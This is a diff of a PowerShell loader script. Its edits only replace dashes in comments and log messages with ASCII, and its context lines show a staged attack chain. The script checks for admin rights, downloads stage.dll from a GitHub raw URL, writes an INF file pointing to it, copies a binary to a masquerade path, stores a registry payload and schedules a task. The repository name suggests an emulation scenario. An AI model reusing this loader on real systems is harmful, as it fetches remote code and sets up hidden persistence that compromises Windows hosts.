@@ -1,6 +1,6 @@
 param()
 
-# ── Elevation Gate ──────────────────────────────────────────────
+# -- Elevation Gate ----------------------------------------------
 $isAdmin = [Security.Principal.WindowsPrincipal]::new(
     [Security.Principal.WindowsIdentity]::GetCurrent()
 ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -17,7 +17,7 @@ if (-not $isAdmin) {
 
 Write-Host "[*] Running with admin privileges. Proceeding..."
 
-# ── Logging ─────────────────────────────────────────────────────
+# -- Logging -----------------------------------------------------
 $logFile = "C:\ProgramData\loader.log"
 function Write-Log($msg) {
     $parent = Split-Path $logFile -Parent
@@ -25,7 +25,7 @@ function Write-Log($msg) {
     "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
 }
 
-Write-Log "[*] loader.ps1 started — admin=True"
+Write-Log "[*] loader.ps1 started - admin=True"
 
 # Configuration
 $githubBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario1/main"
@@ -48,7 +48,7 @@ Write-Log "[*] Downloading stage.dll from $stageUrl"
 Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing
 if (Test-Path $stagePath) {
     $bytes = (Get-Item $stagePath).Length
-    Write-Log "[+] stage.dll downloaded — $bytes bytes (verified)"
+    Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
 } else {
     Write-Log "[-] stage.dll download FAILED"
 }
@@ -67,7 +67,7 @@ $stagePath
 "@
 Set-Content -Path $infPath -Value $infContent -Force
 if (Test-Path $infPath) {
-    Write-Log "[+] config.inf written — verified"
+    Write-Log "[+] config.inf written - verified"
 } else {
     Write-Log "[-] config.inf write FAILED"
 }
@@ -76,7 +76,7 @@ if (Test-Path $infPath) {
 Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force
 if (Test-Path $masqueradeDst) {
     $mbytes = (Get-Item $masqueradeDst).Length
-    Write-Log "[+] Masquerade OK — $masqueradeDst ($mbytes bytes)"
+    Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
 } else {
     Write-Log "[-] Masquerade FAILED"
 }
@@ -98,7 +98,7 @@ New-Item -Path $regPath -Force | Out-Null
 Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
 $checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
 if ($checkVal) {
-    Write-Log "[+] Registry payload stored at $regPath\$regName — $($checkVal.Length) chars (verified)"
+    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
 } else {
     Write-Log "[-] Registry payload FAILED"
 }
@@ -116,7 +116,7 @@ $taskCheck = schtasks /query /tn $taskName 2>&1
 if ($LASTEXITCODE -eq 0) {
     Write-Log "[+] Task $taskName created (verified)"
 } else {
-    Write-Log "[-] Task creation FAILED — $taskCheck"
+    Write-Log "[-] Task creation FAILED - $taskCheck"
 }
 
 Write-Host "[+] Task '$taskName' scheduled at $taskTime. Running now..."
